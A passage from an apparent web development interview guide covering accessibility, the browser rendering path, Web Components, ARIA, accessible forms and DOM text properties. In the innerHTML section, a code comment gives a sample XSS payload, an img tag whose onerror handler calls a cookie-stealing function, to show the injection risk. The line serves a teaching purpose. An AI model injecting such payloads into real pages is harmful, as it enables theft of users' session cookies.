Web accessibility (often abbreviated a11y — "a" + 11 letters + "y") is the practice of designing and building websites so people with disabilities can perceive, understand, navigate, and interact with them. This includes users who are blind or low-vision, deaf or hard-of-hearing, have motor impairments (can't use a mouse), cognitive disabilities, or situational limitations (bright sunlight, broken arm, slow connection).

It covers several dimensions:
- **Perceivable** — content must be presentable in ways users can perceive (alt text for images, captions for video, sufficient color contrast)
- **Operable** — interface must be usable via keyboard alone, with no time-limit traps, no seizure-inducing flashing
- **Understandable** — readable content, predictable navigation, clear error messages
- **Robust** — content works reliably across assistive technologies (screen readers, switch devices, voice control)

These four principles are the foundation of WCAG (Web Content Accessibility Guidelines), the standard most legal/organizational accessibility requirements reference (e.g., ADA compliance in the US, EN 301 549 in the EU).

Practically, accessibility in HTML comes from: semantic elements (see Q16), proper alt text (see Q32), labeled forms (see Q13, Q35), sufficient color contrast, keyboard operability (see Q36), and ARIA where semantics fall short (see Q33).

It's not a "nice to have" — it's often a legal requirement, and it consistently improves usability for everyone (captions help in noisy environments, good contrast helps in sunlight, keyboard support helps power users).

---

### Q29. How does the browser parse and render HTML? Explain the critical rendering path.

**Answer:**
The critical rendering path (CRP) is the sequence of steps the browser takes to turn HTML, CSS, and JS into pixels on screen. Optimizing it means minimizing time-to-first-paint by reducing what blocks each stage.

1. **Bytes → Characters** — Raw bytes are received over the network and decoded using the encoding declared in `<meta charset>` (e.g., UTF-8) or HTTP headers.
2. **Characters → Tokens** — A tokenizer following the HTML5 parsing spec's state machine breaks characters into tokens (start/end tags, attribute name-value pairs, text, comments). The spec explicitly defines "error recovery" rules — which is why malformed HTML like unclosed tags still renders reasonably instead of crashing.
3. **Tokens → Nodes → DOM** — Tokens become node objects, linked into the DOM tree. The tree respects HTML's implicit rules (e.g., a `<li>` outside a `<ul>`/`<ol>` gets handled per spec-defined recovery behavior). During parsing, a **preload scanner** runs ahead of the main parser, speculatively fetching resources (images, CSS, JS) it finds in the markup — this is why declaring `src`/`href` directly in HTML (not injecting via JS) matters for performance.
4. **CSS → CSSOM** — Parsed in parallel with HTML into the CSS Object Model (also a tree). CSS is **render-blocking**: nothing paints until the CSSOM is complete, because any rule could still change what's visible.
5. **JS execution — bidirectional blocking:**
   - JS is **parser-blocking** by default: a `<script>` tag pauses HTML parsing until the script downloads and runs — because scripts can use `document.write()` or otherwise mutate the DOM being built (`async` downloads in parallel and runs whenever ready; `defer` downloads in parallel but runs after parsing, in order — see Q17).
   - Less commonly known: JS is also **blocked by CSSOM**. If a script sits after a `<link rel="stylesheet">`, the browser holds script execution until CSSOM is ready, since the script might read computed styles. This is why stylesheet placement affects more than just paint.
6. **DOM + CSSOM → Render Tree** — Combines visible nodes only (skips `display: none`, `<head>`, `<script>`, etc.) with their matched/computed styles. Note: `visibility: hidden` *is* included (occupies space, just invisible).
7. **Layout (a.k.a. Reflow on subsequent passes)** — Computes exact position and box-model geometry for every render tree node, relative to the viewport. Triggered by DOM changes, viewport resize, or reading certain layout-dependent properties (`offsetHeight`, etc.) mid-script — the latter causes **layout thrashing** if done in a loop.
8. **Paint** — Rasterizes pixels (text, color, borders, shadows) into layers on the main thread.
9. **Composite** — Layers are handed to the compositor thread and GPU, merged into the final frame. Animating `transform` and `opacity` only touches this step — no layout/paint recalculation — which is why they're the cheap properties to animate.

**Key distinction for interviews:** not every DOM/style change re-runs the whole pipeline. Changing `color` triggers paint + composite only; changing `width` triggers layout + paint + composite; changing `transform` triggers composite only. Being asked "what happens when you change X" and answering with the *minimum* affected stages is a strong signal.

**Optimization techniques:**
- **Eliminate/defer render-blocking CSS** — inline critical above-the-fold CSS, load the rest via `media` attributes or `rel="preload"`.
- **`async`/`defer` non-critical JS**; avoid placing `<script>` before stylesheets when the script needs computed styles.
- **Resource hints** — `preconnect`/`dns-prefetch` for third-party origins, `preload` for late-discovered critical assets (fonts, hero images).
- **Reduce layout scope** — `content-visibility: auto` skips layout/paint for off-screen content; batch DOM reads/writes to avoid thrashing.
- **Prefer compositor-only animations** (`transform`, `opacity`) over properties that force layout (`top`/`left`, `width`/`height`).
- **Lazy-load images** with `loading="lazy"` and reserve space via `width`/`height` (or `aspect-ratio`) to prevent layout shift (CLS).
- **Measure, don't guess** — use Chrome DevTools Performance panel or Lighthouse to confirm which stage is actually the bottleneck (LCP vs TBT vs CLS) before optimizing.

---

### Q30. What are Web Components?

**Answer:**
Web Components let you build custom, reusable HTML elements with encapsulated styling and behavior — using only browser-native APIs, no framework required. A `<user-card>` tag you build this way works in any framework, or none, because it's just an HTML element as far as the browser is concerned.

Three specs make this possible:

**1. Custom Elements** — Register a new tag name backed by a JS class:

```js
class UserCard extends HTMLElement {
  connectedCallback() {
    // Runs when the element is inserted into the DOM
    this.innerHTML = `<p>Hello, ${this.getAttribute('name')}</p>`;
  }
  disconnectedCallback() { /* cleanup, e.g. remove event listeners */ }
  attributeChangedCallback(name, oldVal, newVal) { /* react to attribute changes */ }
  static get observedAttributes() { return ['name']; } // required for attributeChangedCallback to fire
}
customElements.define('user-card', UserCard);
```
Usage: `<user-card name="Alice"></user-card>` — works anywhere HTML works, no build step needed.

**2. Shadow DOM** — Attaches a hidden, isolated DOM subtree to an element. CSS and DOM queries don't cross the shadow boundary in either direction — your component's `<style>` won't leak out, and the page's global styles won't leak in (with some exceptions like inherited properties, e.g. `font-family`).

```js
class UserCard extends HTMLElement {
  connectedCallback() {
    const shadow = this.attachShadow({ mode: 'open' }); // 'open' = accessible via el.shadowRoot; 'closed' = fully hidden
    shadow.innerHTML = `<style>p { color: blue; }</style><p>Hello</p>`;
  }
}
```
This is the actual encapsulation mechanism — without it, "custom elements" would just be regular tags with all the CSS-leakage problems of normal HTML.

**3. HTML Templates** — `<template>` holds inert markup: parsed by the browser but not rendered or executed until you clone it into the DOM via JS. `<slot>` inside a template marks a placeholder where the *consumer's* markup gets projected in (similar to `children`/`ng-content`/default slots in other frameworks).

```html
<template id="card-template">
  <style>p { color: blue; }</style>
  <p><slot name="username">Default Name</slot></p>
</template>
```
```js
const tpl = document.getElementById('card-template');
shadow.appendChild(tpl.content.cloneNode(true));
```
Usage: `<user-card><span slot="username">Alice</span></user-card>` — "Alice" gets projected into the slot.

**Why this matters / when it's used:**
- **Framework-agnostic distribution** — design systems (e.g. Shoelace, Ionic) ship as Web Components so one component library works across React, Vue, Angular, or vanilla JS.
- **True style isolation** — Shadow DOM gives you CSS scoping without CSS Modules, styled-components, or naming conventions like BEM.
- **Trade-offs**: no built-in reactive state/data-binding (you manage DOM updates manually or reach for a small helper lib like Lit), weaker SSR story than frameworks, and passing complex data (objects/arrays) through attributes requires manual serialization or setting JS properties directly.

**Angular's relationship to this:** Angular components compile down to standard JS/DOM but are *not* Web Components by default — they rely on Angular's own change detection and module system, and can't be used outside an Angular app as-is. `@angular/elements` bridges this by wrapping an Angular component in a Custom Elements shell (`createCustomElement()`), so it can be dropped into any HTML page or consumed by another framework as a native `<my-widget>` tag.

---

### Q31. How can you optimize HTML page performance?

**Answer:**
Performance optimization spans markup, resource loading, and rendering strategy. Key levers:

**Reduce and defer resource weight**
- Minify HTML/CSS/JS (strip whitespace, comments)
- Compress images (WebP/AVIF), use `srcset`/`<picture>` to serve appropriately sized images (see Q26)
- Lazy-load offscreen images/iframes with `loading="lazy"` (but not above-the-fold content — see Q27)

**Control script loading**
- Use `defer` or `async` on `<script>` tags so parsing isn't blocked (see Q17)
- Place non-critical scripts at the end of `<body>` or defer them
- Avoid render-blocking synchronous scripts in `<head>`

**Minimize render-blocking CSS**
- Inline critical above-the-fold CSS, load the rest asynchronously
- Avoid deeply nested/overly specific selectors that slow style computation

**Reduce DOM size and complexity**
- Fewer, flatter DOM nodes — deep nesting slows layout/reflow calculations
- Avoid unnecessary wrapper `<div>`s

**Leverage caching and delivery**
- Set proper HTTP cache headers for static assets
- Use a CDN to reduce latency
- Enable gzip/Brotli compression on the server

**Minimize layout shifts and reflows**
- Specify `width`/`height` (or `aspect-ratio`) on images/video to reserve space before they load, preventing Cumulative Layout Shift
- Avoid injecting content above existing content after load

**Preload/prefetch key resources**
```html
<link rel="preload" href="font.woff2" as="font" crossorigin>
<link rel="preconnect" href="https://fonts.googleapis.com">
```

Together these target the metrics that matter most: First Contentful Paint, Largest Contentful Paint, Time to Interactive, and Cumulative Layout Shift (the Core Web Vitals).

---

### Q32. Why is the `alt` attribute important?

**Answer:**
`alt` provides a text alternative for an image — describing what the image conveys, for contexts where the image itself can't be seen.

```html
<img src="chart.png" alt="Bar chart showing revenue growth from $2M to $8M between 2022 and 2026">
```

**Why it matters:**
- **Screen readers** read `alt` text aloud — without it, a blind user hears "image" or the filename, with zero context.
- **Broken images** — if the image fails to load, alt text displays as fallback so the user still gets the information.
- **SEO** — search engines can't "see" images; alt text is a primary signal for image search indexing and content relevance.
- **Slow connections / images disabled** — some users browse with images off entirely; alt preserves meaning.

**Writing good alt text:**
- Describe the content and function, not just "image of X" (redundant — screen readers already announce it's an image)
- Keep it concise but meaningful — describe what matters in context, not every visual detail
- For purely decorative images (that add no informational value), use `alt=""` (empty, not omitted) — this tells screen readers to skip it entirely, rather than announcing the filename
- For images that are also links/buttons, describe the destination or action, not the picture: `alt="Go to homepage"` not `alt="Company logo"`

**Omitting `alt` entirely (vs. `alt=""`) is a validation error and a worse experience** — always include the attribute, even if empty for decorative images.

---

### Q33. What is ARIA and when should you use it?

**Answer:**
ARIA (Accessible Rich Internet Applications) is a set of HTML attributes that add accessibility information to elements — roles, states, and properties — for assistive technologies, especially when native HTML semantics aren't sufficient.

**Three categories of ARIA attributes:**
- **Roles** — define what an element is (`role="button"`, `role="dialog"`, `role="alert"`)
- **Properties** — define characteristics (`aria-label`, `aria-describedby`, `aria-required`)
- **States** — define current condition, often dynamic (`aria-expanded`, `aria-hidden`, `aria-checked`, `aria-disabled`)

Example — a custom dropdown built from `<div>`s (not ideal, but sometimes necessary for custom widgets):
```html
<div role="button" tabindex="0" aria-expanded="false" aria-haspopup="listbox">
  Select an option
</div>
```

**When to use ARIA:** primarily for custom interactive widgets that have no native HTML equivalent — custom dropdowns, tabs, modals, tooltips, sliders, tree views. Native HTML doesn't have a `<tabs>` element, so you build it from `<div>`s and communicate its behavior via `role="tablist"`, `role="tab"`, `aria-selected`, etc.

**The First Rule of ARIA:** if a native HTML element or attribute has the semantics you need, use it instead of re-purposing an element and adding ARIA. ARIA is a patch for gaps, not a replacement for semantic HTML — see Q34 for why this matters.

**Common legitimate uses even with semantic HTML:**
- `aria-label` — accessible name when visible text label isn't present (e.g., icon-only button)
- `aria-live="polite"` — announce dynamic content changes (e.g., a form error appearing without page reload)
- `aria-hidden="true"` — hide purely decorative elements from assistive tech (e.g., a decorative icon next to text)

---

### Q34. What is the difference between semantic HTML and ARIA?

**Answer:**
They solve overlapping problems but work very differently, and semantic HTML should always be the first choice.

| | Semantic HTML | ARIA |
|---|---|---|
| What it is | Native elements with built-in meaning and behavior (`<button>`, `<nav>`) | Attributes added on top of elements to describe roles/states |
| Behavior included? | Yes — keyboard support, focus, default styling come free | No — ARIA only changes what's announced; you must implement behavior (focus management, keyboard handlers) yourself |
| Browser support | Universally implemented correctly | Implementation varies more; misuse is common and easy |
| Failure mode | Rare — hard to "get wrong" | Easy to get wrong — incorrect ARIA can make things less accessible than no ARIA at all |

**The key distinction:** `<button>` gives you semantics and functionality automatically. `<div role="button">` only gives you the announcement "this is a button" — you still have to manually add `tabindex="0"`, `keydown` handlers for Enter/Space, and focus styling. Miss any of these and you have something that sounds accessible to a screen reader but doesn't behave accessibly for a keyboard user.

This is why the accessibility community's guidance is: **"No ARIA is better than bad ARIA."** Use semantic elements whenever one exists for your use case; reach for ARIA only to fill genuine gaps (custom widgets with no native equivalent) — and even then, prefer it as a supplement to real functional accessibility (correct `tabindex`, event handling), not a substitute for it.

---

### Q35. How do you make an HTML form accessible?

**Answer:**
A checklist of concrete practices:

**1. Label every input**
```html
<label for="email">Email address</label>
<input type="email" id="email" name="email" required>
```
Never rely on `placeholder` alone — it disappears on focus and isn't reliably read by all assistive tech (see Q13).

**2. Group related fields with `<fieldset>` and `<legend>`**
```html
<fieldset>
  <legend>Shipping address</legend>
  <label for="street">Street</label>
  <input id="street" name="street">
</fieldset>
```
Especially important for radio button/checkbox groups, so screen readers announce the group's purpose.

**3. Use the correct input type** — `type="email"`, `type="tel"`, `type="date"` etc. trigger appropriate mobile keyboards and enable native validation — better than a generic `type="text"` for everything.

**4. Communicate errors clearly and programmatically**
```html
<input type="email" id="email" aria-describedby="email-error" aria-invalid="true">
<span id="email-error">Please enter a valid email address</span>
```
`aria-describedby` links the error message to the field so screen readers announce it on focus. Don't rely on color alone (e.g., red border) to indicate an error — pair it with text/icon.

**5. Ensure logical tab order** — Follow natural DOM order rather than manually reordering with high `tabindex` values, which creates confusing navigation.

**6. Make required fields clear** — Use the `required` attribute (enables native + assistive tech announcement) — don't rely solely on a visual asterisk.

**7. Provide clear, accessible submit feedback** — Use `aria-live="polite"` regions for success/error messages that appear dynamically without a full page reload, so screen reader users are notified.

**8. Sufficient touch target size and spacing** — Especially for checkboxes/radios — pair them with a clickable `<label>` so the target area is large enough (WCAG recommends ~44×44px minimum).

---

### Q36. How do you make a website keyboard accessible?

**Answer:**
Many users (motor impairments, screen reader users, power users) navigate entirely via keyboard — no mouse. Key requirements:

**1. All interactive elements must be reachable via Tab** — Use native interactive elements (`<button>`, `<a href>`, `<input>`) — they're focusable by default. Custom widgets built from `<div>`/`<span>` need `tabindex="0"` added manually to be reachable.

**2. Logical, predictable focus order** — Tab order should follow visual/reading order (top-to-bottom, left-to-right). Avoid `tabindex` values greater than 0 — they override natural order and create confusing jumps. Use `tabindex="0"` (join natural order) or `tabindex="-1"` (programmatically focusable, not in Tab order) only.

**3. Visible focus indicators** — Never remove the browser's default focus outline (`outline: none`) without providing a clear custom replacement. Keyboard users need to see where focus currently is.
```css
/* Bad */
button:focus { outline: none; }

/* Good */
button:focus-visible { outline: 2px solid blue; outline-offset: 2px; }
```

**4. All functionality operable via keyboard** — Every mouse interaction (click, hover, drag) needs a keyboard equivalent:
- Click → Enter/Space (native on `<button>`/`<a>`, must be manually handled on custom `role="button"` elements)
- Hover-triggered menus need a keyboard-accessible way to open (e.g., Enter to open, Escape to close)
- Modals must trap focus inside while open, and return focus to the trigger element on close

**5. Skip links** — A hidden-until-focused link at the very top of the page letting keyboard users jump past repetitive navigation straight to main content:
```html
<a href="#main" class="skip-link">Skip to main content</a>
...
<main id="main">...</main>
```

**6. Manage focus on dynamic content changes** — When a modal opens, move focus into it; when it closes, return focus to the triggering element. When new content loads (e.g., single-page app route change), move focus to the new content's heading.

**7. No keyboard traps** — Users must always be able to Tab out of any component (a common bug in poorly-built custom modals/widgets).

**Testing tip:** unplug your mouse and try to complete every core user flow using only Tab, Shift+Tab, Enter, Space, and Escape — that's the real test of keyboard accessibility.

---

### Q37. What is the difference between `innerHTML`, `textContent`, and `innerText`?

**Answer:**
All three are DOM properties for reading/writing an element's content, but they differ fundamentally in what they parse, what they trigger, and how safe they are.

**`innerHTML`**
Gets/sets content as an HTML string — the browser parses it and builds actual DOM nodes.

```js
el.innerHTML = "<strong>Bold</strong> text";
// Creates a real <strong> element inside el
```
- **Parses markup** — tags become real elements, so it's the only one of the three that can insert structured HTML
- **Triggers reflow/repaint** — DOM mutation always does, and re-parsing HTML on every write is comparatively expensive
- **XSS risk** — if you insert unsanitized user input via `innerHTML`, any `<script>` or event handler attributes (`onerror=`, `onload=`) in that string can execute in the page's context. This is one of the most common real-world XSS vectors.

```js
// Dangerous if `userInput` comes from an untrusted source
el.innerHTML = userInput; // could inject <img src=x onerror="stealCookies()">
```
Reading `innerHTML` also serializes the DOM back into an HTML string, including re-escaping — so `el.innerHTML` after a `textContent` write may not exactly match the original.

**`textContent`**
Gets/sets content as raw, literal text — no HTML parsing at all. Any markup you assign is inserted as literal characters, not elements.

```js
el.textContent = "<strong>Bold</strong> text";
// Renders literally as: <strong>Bold</strong> text (visible tags, not bold)
```
- **Never parses HTML** — immune to injection-based XSS, because a `<script>` string just becomes visible text, never executes
- **Ignores CSS entirely** — returns all text content of an element and its descendants, including text inside `display: none` or `visibility: hidden` elements, and ignores `<br>`-induced line breaks or `text-transform` styling
- **Fastest** — no HTML parsing, and browsers can skip style/layout recalculation tied to visibility since it doesn't care about rendering state
- **Best default choice** whenever you're inserting plain text, especially anything derived from user input

```js
// Safe, regardless of what commentText contains
commentEl.textContent = userComment;
```

**`innerText`**
Similar to `textContent` in that it doesn't parse HTML, but it's aware of rendered/visible state — it reflects what a user would actually see on screen, not the raw DOM text.

```js
el.innerText = "Some text"; // still just plain text, no HTML parsing
```
**Key differences from `textContent`:**
- **Respects CSS** — excludes text inside elements with `display: none`, and includes visual line breaks caused by `<br>` or block-level elements (approximates rendered layout)
- **Triggers a reflow to read** — because it needs to know the rendered state (what's actually visible), reading `innerText` forces the browser to recalculate layout first — this makes it noticeably slower than `textContent`, especially in a loop
- **Non-standard historically** (originated in IE) but now standardized and supported everywhere — still considered less consistent across browsers/edge cases than `textContent`

**When to use which**

| Goal | Use |
|---|---|
| Insert/read plain text (esp. from user input) | `textContent` — safest, fastest |
| Insert trusted, pre-sanitized HTML markup | `innerHTML` (with a sanitizer library like DOMPurify if any part is untrusted) |
| Read only the visibly rendered text, respecting CSS | `innerText` (accept the reflow cost) |
| Read all text regardless of visibility (e.g. hidden elements) | `textContent` |

**Rule of thumb:** default to `textContent` unless you specifically need to render markup (`innerHTML`, sanitized) or visibility-aware text extraction (`innerText`).

---
